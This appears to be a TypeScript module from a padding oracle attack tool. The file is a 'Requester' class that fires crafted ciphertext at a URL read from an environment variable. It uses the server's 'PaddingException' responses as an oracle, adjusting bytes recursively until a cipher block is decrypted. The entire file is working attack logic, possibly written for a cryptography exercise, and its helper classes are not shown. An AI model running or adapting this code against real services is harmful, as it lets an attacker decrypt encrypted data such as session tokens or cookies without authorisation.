import fetch from "node-fetch";
import CryptUtil from "./CryptUtil";
import PseudoBlock from "./PseudoBlock";
import TextUtils from "./TextUtils";

export default class Requester {
  private readonly cu: CryptUtil;
  private readonly tu: TextUtils;
  private readonly pseudo: PseudoBlock;

  constructor(block: Buffer, iv: Buffer) {
    this.cu = new CryptUtil();
    this.tu = new TextUtils();
    this.pseudo = new PseudoBlock(block, iv);
  }

  protected async send(payload: string): Promise<string> {
    const url = process.env.URL + payload;

    const resp = await fetch(url);
    if (!resp.ok) {
      throw new Error(`Fetch error (${resp.status}): ${resp.statusText}`);
    }

    return await resp.text();
  }

  protected paddingError(text: string): boolean {
    if (/PaddingException/gi.test(text)) {
      return true;
    }

    return false;
  }

  protected async checkPaddingValidity(payload: string): Promise<boolean> {
    const response = await this.send(payload);
    return !this.paddingError(response);
  }

  public async decipherBlock(): Promise<Buffer> {
    const binData = this.cu.joinBlocks(this.pseudo.getFake());
    const payload = this.tu.bytes2src(binData);

    const result = await this.checkPaddingValidity(payload);

    if (result) {
      const isRoyalFlush = this.pseudo.bingo();
      if (isRoyalFlush !== null) {
        return isRoyalFlush;
      }
      console.log("Found byte!");
    } else {
      this.pseudo.incrementByte();
    }

    return this.decipherBlock();
  }
}
